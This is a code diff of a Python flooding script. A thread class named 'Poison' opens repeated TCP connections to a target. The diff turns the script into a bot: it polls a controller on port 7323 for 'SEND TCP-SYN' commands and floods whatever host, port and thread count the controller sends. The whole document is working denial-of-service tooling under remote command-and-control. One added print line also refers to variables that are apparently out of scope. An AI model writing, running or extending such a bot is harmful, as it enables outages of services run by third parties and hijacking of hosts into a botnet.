@@ -12,6 +12,8 @@ class Poison (threading.Thread):
     def run(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+        print(f'Connecting to {url}:{port}')
+
         sock.connect((self.url, self.port))
 
         time.sleep(1)
@@ -32,6 +34,24 @@ def attack(url, port, n):
     for thread in threads:
         thread.join()
 
-attack("localhost", 80, 10)
-            
+while True:
+    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    master.connect(("localhost", 7323))
 
+    res = master.recv(64)
+
+    command = res.decode("utf-8")
+
+    try:
+        if command.startswith("SEND TCP-SYN"):
+            args = command.split()
+            url = args[2]
+            port = int(args[3])
+            n = int(args[4])
+            print(url, port)
+            attack(url, port, n)
+    except Exception as e:
+        print("Error decoding command")
+        print(e)
+    master.close()
+    time.sleep(3)
